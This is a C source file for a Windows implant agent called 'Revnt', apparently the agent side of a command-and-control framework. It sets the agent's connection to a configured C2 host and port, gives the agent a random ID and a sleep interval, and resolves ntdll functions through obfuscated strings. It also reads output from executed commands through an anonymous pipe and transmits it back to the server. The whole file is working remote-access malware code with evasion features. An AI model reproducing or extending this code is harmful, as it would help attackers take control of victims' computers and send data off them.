#include <Revnt.h>

#include <Core.h>
#include <Config.h>
#include <Package.h>
#include <Command.h>
#include <RevntStrings.h>
#include <ObfuscateStrings.h>


VOID RevntInit()
{
    // DeObf Arrays
    BYTE local_sRtlRandomEx[12];
    BYTE local_sRtlGetVersion[14];

    // Init Connection info
    Instance.Config.Transport.UserAgent = CONFIG_USER_AGENT;
    Instance.Config.Transport.Host      = CONFIG_HOST;
    Instance.Config.Transport.Port      = CONFIG_PORT;
    Instance.Config.Transport.Secure    = CONFIG_SECURE;


    // Init Win32

    Instance.Win32.RtlRandomEx   = (ULONG (*)(PULONG)) GetProcAddress(GetModuleHandleA(sNtdll), sRtlRandomEx(local_sRtlRandomEx));
    Instance.Win32.RtlGetVersion = (void (*)(POSVERSIONINFOEXW)) GetProcAddress(GetModuleHandleA(sNtdll),
                                                                                sRtlGetVersion(local_sRtlGetVersion));

    Instance.Session.AgentID = RandomNumber32();
    Instance.Config.Sleeping = CONFIG_SLEEP;

    _tprintf( "AgentID     => %x\n", Instance.Session.AgentID );
    _tprintf( "Magic Value => %x\0\n", REVNT_MAGIC_VALUE );
}

VOID AnonPipeRead( HANDLE hSTD_OUT_Read )
{
    PPACKAGE Package         = NULL;
    LPVOID   pOutputBuffer   = NULL;
    UCHAR    buf[ 1025 ]     = { 0 };
    DWORD    dwBufferSize    = 0;
    DWORD    dwRead          = 0;
    BOOL     SuccessFul      = FALSE;

    pOutputBuffer = LocalAlloc( LPTR, sizeof(LPVOID) );

    do
    {
        SuccessFul = ReadFile( hSTD_OUT_Read, buf, 1024, &dwRead, NULL );

        if ( dwRead == 0)
            break;

        pOutputBuffer = LocalReAlloc(
            pOutputBuffer,
            dwBufferSize + dwRead,
            LMEM_MOVEABLE | LMEM_ZEROINIT
        );

        dwBufferSize += dwRead;

        memcpy( pOutputBuffer + ( dwBufferSize - dwRead ), buf, dwRead );
        memset( buf, 0, dwRead );

    } while ( SuccessFul == TRUE );

    Package = PackageCreate( COMMAND_OUTPUT );

    PackageAddBytes( Package, pOutputBuffer, dwBufferSize );
    PackageTransmit( Package, NULL, NULL );

    memset( pOutputBuffer, 0, dwBufferSize );
    LocalFree( pOutputBuffer );
    pOutputBuffer = NULL;
}

ULONG RandomNumber32( VOID )
{
    ULONG Seed = 0;

    Seed = GetTickCount();
    Seed = Instance.Win32.RtlRandomEx( &Seed );
    Seed = Instance.Win32.RtlRandomEx( &Seed );
    Seed = ( Seed % ( LONG_MAX - 2 + 1 ) ) + 2;

    return Seed % 2 == 0 ? Seed : Seed + 1;
}
